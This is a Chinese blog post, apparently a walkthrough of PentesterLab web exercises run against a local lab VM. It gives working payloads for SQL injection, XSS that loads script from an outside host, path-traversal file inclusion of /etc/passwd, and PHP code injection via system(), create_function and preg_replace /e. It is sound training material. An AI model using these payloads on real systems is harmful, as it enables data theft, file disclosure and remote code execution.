@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="default">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>Pentester Lab Writeup | Hc1m1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="玩了下exploit, 再来玩玩pentest。">
+<meta name="keywords" content="Pentest">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pentester Lab Writeup">
+<meta property="og:url" content="http://0x48.pw/2016/03/21/0x15/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description" content="玩了下exploit, 再来玩玩pentest。">
+<meta property="og:updated_time" content="2016-03-28T10:18:37.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pentester Lab Writeup">
+<meta name="twitter:description" content="玩了下exploit, 再来玩玩pentest。">
+  
+    <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  
+      <link href="//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css" rel="stylesheet">
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+      <script>
+          var _hmt = _hmt || [];
+          (function() {
+              var hm = document.createElement("script");
+              hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+          })();
+      </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+</head>
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Hcamael</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Blog</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Binary/" style="font-size: 16px;">Binary</a> <a href="/tags/CBC-Padding-Oracle-Attack/" style="font-size: 10px;">CBC Padding Oracle Attack</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 18px;">Crypto</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Old博文/" style="font-size: 10px;">Old博文</a> <a href="/tags/PWN/" style="font-size: 14px;">PWN</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Pwn/" style="font-size: 12px;">Pwn</a> <a href="/tags/Python/" style="font-size: 14px;">Python</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/SHA1-Length-Extension-Attack/" style="font-size: 10px;">SHA1 Length Extension Attack</a> <a href="/tags/SQLi/" style="font-size: 12px;">SQLi</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/Wechall/" style="font-size: 10px;">Wechall</a> <a href="/tags/php/" style="font-size: 14px;">php</a> <a href="/tags/安全研究/" style="font-size: 12px;">安全研究</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/检讨/" style="font-size: 10px;">检讨</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/网络/" style="font-size: 10px;">网络</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://wiki.hduisa.org">wiki</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://drops.hduisa.org">Drops</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lorexxar.cn">Lorexxar</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">HDUISA, web狗, 菜鸡H, 正在向bin爷爷努力前进</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Blog</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-0x15" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/03/21/0x15/" class="article-date">
+      <time datetime="2016-03-21T02:16:46.000Z" itemprop="datePublished">2016-03-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Pentester Lab Writeup
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/H-blog/">H-blog</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pentest/">Pentest</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <blockquote>
+<p>玩了下exploit, 再来玩玩pentest。</p>
+</blockquote>
+<a id="more"></a>
+<h1 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h1><h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h2><p>没做任何过滤，简单。。不过看了下，mysql的用户没啥权限，所以最多就是查看数据库信息了，没法读系统文件，写文件getshell。。<br>Payload:<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://<span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example<span class="number">1</span>.php?name=admin<span class="symbol">%27</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%20</span>version(),load_file(<span class="symbol">%22</span>/etc/passwd<span class="symbol">%22</span>),user(),<span class="number">4</span>,<span class="number">5</span><span class="symbol">%23</span></div></pre></td></tr></table></figure></p>
+<h2 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h2><p>这题就过滤了空格呗。。也简单。。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.102/sqli/example2.php?name=root%27<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">version</span>(),<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span>%<span class="number">23</span></div><div class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.102</span>/sqli/example2.php?<span class="keyword">name</span>=root%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>SCHEMA_NAME,<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.SCHEMATA%<span class="number">23</span></div><div class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.56</span><span class="number">.102</span>/sqli/example2.php?<span class="keyword">name</span>=root%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>TABLE_NAME,<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.TABLES<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=%<span class="number">22</span>exercises%<span class="number">22</span>%<span class="number">23</span></div></pre></td></tr></table></figure></p>
+<h2 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h2><p>只能说上题的payload还能用。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.102/sqli/example3.php?name=root%27<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="keyword">version</span>(),<span class="number">4</span>,<span class="number">5</span>%<span class="number">23</span></div></pre></td></tr></table></figure></p>
+<p>去看看源码。。看看这两题的过滤有啥区别。。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//example2.php</span></div><div class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/ /'</span>, $_GET[<span class="string">"name"</span>])) &#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">"ERROR NO SPACE"</span>);	</div><div class="line">&#125;</div><div class="line"><span class="comment">//example3.php</span></div><div class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/\s+/'</span>, $_GET[<span class="string">"name"</span>])) &#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">"ERROR NO SPACE"</span>);	</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<p>这过滤对我的payload并没有影响。。</p>
+<h2 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4"></a>Example 4</h2><p>换整型注入了。。一样。。<br>Payload:<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://<span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example<span class="number">4</span>.php?id=<span class="number">2</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%20</span>user(),version(),database(),<span class="number">4</span>,<span class="number">5</span><span class="symbol">%23</span></div></pre></td></tr></table></figure></p>
+<h2 id="Example-5"><a href="#Example-5" class="headerlink" title="Example 5"></a>Example 5</h2><p>上题的payload还是可以用，这题的过滤是要求0-9开头<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://<span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example<span class="number">5</span>.php?id=<span class="number">2</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%20</span>user(),version(),database(),<span class="number">5</span>,<span class="number">6</span><span class="symbol">%23</span></div></pre></td></tr></table></figure></p>
+<h2 id="Example-6"><a href="#Example-6" class="headerlink" title="Example 6"></a>Example 6</h2><p>猜到了，这题是要求0-9结尾。。一样简单<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://<span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example<span class="number">6</span>.php?id=<span class="number">2</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%20</span>user(),version(),database(),<span class="number">4</span>,<span class="number">5</span><span class="symbol">%233</span></div></pre></td></tr></table></figure></p>
+<h2 id="Example-7"><a href="#Example-7" class="headerlink" title="Example 7"></a>Example 7</h2><p>这题看了源码。<br>Payload:<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://<span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example<span class="number">7</span>.php?id=<span class="number">2</span><span class="symbol">%0</span>aunion<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%20</span>version(),user(),database(),<span class="number">4</span>,<span class="number">5</span><span class="symbol">%23</span></div></pre></td></tr></table></figure></p>
+<p>这题需要用%0a来bypass，因为。。看源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^-?[0-9]+$/m'</span>, $_GET[<span class="string">"id"</span>])) &#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">"ERROR INTEGER REQUIRED"</span>);	</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<p>主要是最后的/m</p>
+<blockquote>
+<p>m (PCRE_MULTILINE)<br>默认情况下，PCRE 认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行)， “行首”元字符 (^) 仅匹配字符串的开始位置， 而”行末”元字符 (\$) 仅匹配字符串末尾， 或者最后的换行符(除非设置了 D 修饰符)。这个行为和 perl 相同。当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 “\n” 字符，或者模式中没有出现 ^ 或 \$，设置这个修饰符不产生任何影响。</p>
+</blockquote>
+<p>意思就是，加了一个\n后，就会有两行，只要其中一行满足正则匹配就会返回true</p>
+<h2 id="Example-8"><a href="#Example-8" class="headerlink" title="Example 8"></a>Example 8</h2><p>很明显，是在<code>order by</code>的位置注，不过就不能使用union了，所以用布尔盲注。。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.102/sqli/example8.php?order=id`,(<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">user</span>(), [var1],<span class="number">1</span>))=[var2])%<span class="number">23</span></div></pre></td></tr></table></figure></p>
+<p>写个脚本跑这个payload就好了，有两个变量var1和var2，var1是int型表示字符串的几var1位，var2就是跑ascii码，如果页面有显示内容，则表示user()第var1字符的ascii码为var2。</p>
+<p>以前写过这样的脚本，现在就懒得写了。。</p>
+<h2 id="Example-9"><a href="#Example-9" class="headerlink" title="Example 9"></a>Example 9</h2><p>和前面一个比，就是少了一个`， 其他都一样<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example8.php?order=id, (<span class="keyword">select</span>%20ascii(<span class="keyword">substr</span>(user(), [var1],<span class="number">1</span>))=[var2])%23</div></pre></td></tr></table></figure></p>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="Example-1-1"><a href="#Example-1-1" class="headerlink" title="Example 1"></a>Example 1</h2><p>很简单，没做过过滤的xss<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">http</span>://192.168.56.102/xss/example1.php?name=hacker<span class="number">%3</span>Cscript<span class="number">%20</span>src=<span class="number">%22</span>http://xxx.xxx.xxx/template/alert.js<span class="number">%22</span><span class="number">%3</span>E<span class="number">%3</span>C/script<span class="number">%3</span>E</div></pre></td></tr></table></figure></p>
+<p>成功弹窗</p>
+<h2 id="Example-2-1"><a href="#Example-2-1" class="headerlink" title="Example 2"></a>Example 2</h2><p>变个大小写就好了<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">http</span>://192.168.56.102/xss/example2.php?name=hacker<span class="number">%3</span>Cscript<span class="number">%20</span>src=<span class="number">%22</span>http://xxx/template/alert.js<span class="number">%22</span><span class="number">%3</span>E<span class="number">%3</span>C/scriPT<span class="number">%3</span>E</div></pre></td></tr></table></figure></p>
+<h2 id="Example-3-1"><a href="#Example-3-1" class="headerlink" title="Example 3"></a>Example 3</h2><p>价格空格就好了<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">http</span>://192.168.56.102/xss/example3.php?name=hacker<span class="number">%3</span>CscripT<span class="number">%20</span>src=<span class="number">%22</span>http://xxx/template/alert.js<span class="number">%22</span><span class="number">%3</span>E<span class="number">%3</span>C/Script<span class="number">%20</span><span class="number">%3</span>E</div></pre></td></tr></table></figure></p>
+<h2 id="Example-4-1"><a href="#Example-4-1" class="headerlink" title="Example 4"></a>Example 4</h2><p>过滤了script，而且不是去掉而是出现了就直接报错，不过任然可以日。<br>payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">http</span>://192.168.56.102/xss/example4.php?name=hacker<span class="number">%3</span>Csvg/onload=<span class="number">%22</span>var<span class="number">%20</span>i=String.fromCharCode(115,<span class="number">%2099</span>,<span class="number">%20114</span>,<span class="number">%20105</span>,<span class="number">%20112</span>,<span class="number">%20116</span>);s<span class="number">%20</span>=<span class="number">%20</span>createElement(i);body.appendChild(s);s.src=<span class="number">%27</span>http://xxx/template/alert.js<span class="number">%27</span>;<span class="number">%22</span></div></pre></td></tr></table></figure></p>
+<h2 id="Example-5-1"><a href="#Example-5-1" class="headerlink" title="Example 5"></a>Example 5</h2><p>过滤的是alert，可惜我都不是直接用alert, 改个文件名就好了<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">http</span>://192.168.56.102/xss/example5.php?name=hacker<span class="number">%3</span>Cscript<span class="number">%20</span>src=<span class="number">%22</span>http://xxx/myjs/test.js<span class="number">%22</span><span class="number">%3</span>E<span class="number">%3</span>C/script<span class="number">%3</span>E</div></pre></td></tr></table></figure></p>
+<h2 id="Example-6-1"><a href="#Example-6-1" class="headerlink" title="Example 6"></a>Example 6</h2><p>这回代码是插在<code>&lt;script&gt;</code>里面, 没做啥过滤<br>payload:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.102</span><span class="regexp">/xss/</span>example6.php?name=script<span class="string">";s=document.createElement($a);s.src="</span>http:<span class="regexp">//</span>xxx<span class="regexp">/template/</span>alert.js<span class="string">";document.getElementsByTagName( "</span>head<span class="string">" )[0].appendChild(s);//</span></div></pre></td></tr></table></figure></p>
+<h2 id="Exmple-7"><a href="#Exmple-7" class="headerlink" title="Exmple 7"></a>Exmple 7</h2><p>…过滤了双引号。。不过和上题有差？<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.102</span><span class="regexp">/xss/</span>example7.php?name=script<span class="string">';s=document.createElement($a);s.src='</span>http:<span class="regexp">//</span>xxx<span class="regexp">/template/</span>alert.js<span class="string">';document.getElementsByTagName( '</span>head<span class="string">')[0].appendChild(s);//</span></div></pre></td></tr></table></figure></p>
+<h2 id="Example-8-1"><a href="#Example-8-1" class="headerlink" title="Example 8"></a>Example 8</h2><p>这题改成POST了，然后直接输出，把尖括号编码了。。能艹？上次SSCTF也有类似的题，可是是通过框架来日。。所以看了下源码。。<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;form action=<span class="string">"&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;"</span> method=<span class="string">"<span class="keyword">POST</span>"</span>&gt;</div></pre></td></tr></table></figure></p>
+<p>好了，有了这句就能艹了。。原来不是用POST</p>
+<p>payload:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.102/xss/example8.php/"&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xxx/template/alert.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<h2 id="Example-9-1"><a href="#Example-9-1" class="headerlink" title="Example 9"></a>Example 9</h2><p>这题貌似看浏览器啊。。用firefox会自动帮你urlencode，用chrome成功了。。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.102/xss/example9.php#<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xss.lazysheep.cc/template/alert.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<h1 id="File-Include"><a href="#File-Include" class="headerlink" title="File Include"></a>File Include</h1><h2 id="Example-1-2"><a href="#Example-1-2" class="headerlink" title="Example 1"></a>Example 1</h2><p>很简单。。没做任何过滤<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.102</span><span class="regexp">/fileincl/</span>example1.php?page=<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</div></pre></td></tr></table></figure></p>
+<h2 id="Example-2-2"><a href="#Example-2-2" class="headerlink" title="Example 2"></a>Example 2</h2><p>也简单，就是会在名字后面自动加上<code>.php</code>，用%00可以bypass<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.102</span><span class="regexp">/fileincl/</span>example2.php?page=<span class="regexp">/etc/</span>passwd%<span class="number">00</span></div></pre></td></tr></table></figure></p>
+<h1 id="Code-injection"><a href="#Code-injection" class="headerlink" title="Code injection"></a>Code injection</h1><h2 id="Example-1-3"><a href="#Example-1-3" class="headerlink" title="Example 1"></a>Example 1</h2><p>入门的代码执行漏洞。。没做任何过滤。。<br>payload:<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.102</span>/codeexec/example1.php?name=%22;<span class="keyword">system</span>(%27cat%20/etc/passwd%27);<span class="regexp">//</span></div></pre></td></tr></table></figure></p>
+<h2 id="Example-2-3"><a href="#Example-2-3" class="headerlink" title="Example 2"></a>Example 2</h2><p>这题也不难，搜索一下<code>php create_function 代码注入</code>，我来分析下。。源码如下<br><figure class="highlight nsis"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">usort(<span class="variable">$users</span>, create_function(<span class="string">'<span class="variable">$a</span>, <span class="variable">$b</span>'</span>, <span class="string">'return strcmp(<span class="variable">$a</span>-&gt;'</span>.<span class="variable">$order</span>.<span class="string">',<span class="variable">$b</span>-&gt;'</span>.<span class="variable">$order</span>.<span class="string">');'</span>))<span class="comment">;</span></div></pre></td></tr></table></figure></p>
+<p>然后系统会拼凑一个函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span><span class="params">($a, $b)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> strcmp($a-&gt;$order, $b-&gt; $order); &#125;</div></pre></td></tr></table></figure></p>
+<p>然后会使用eval函数，看到这里就好了。。<br>Payload：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.102</span><span class="regexp">/codeexec/</span>example2.php?order=id,<span class="variable">$b</span>-%<span class="number">3</span>Ename);&#125;phpinfo();<span class="regexp">//</span></div></pre></td></tr></table></figure></p>
+<p>这样拼凑的函数就成了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span><span class="params">($a,$b)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> strcmp($a-&gt;id, $b-&gt;name);&#125;phpinfo();<span class="comment">//);&#125;</span></div></pre></td></tr></table></figure></p>
+<h2 id="Example-3-2"><a href="#Example-3-2" class="headerlink" title="Example 3"></a>Example 3</h2><p>这题随便试下报错发现用了preg_replace，然后又是代码注入的题，自然想到了<code>\e</code>修饰符<br>Payload:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.101</span><span class="regexp">/codeexec/</span>example3.php?new=phpinfo()&amp;pattern=<span class="regexp">/lamer/</span>e&amp;base=lamer</div></pre></td></tr></table></figure></p>
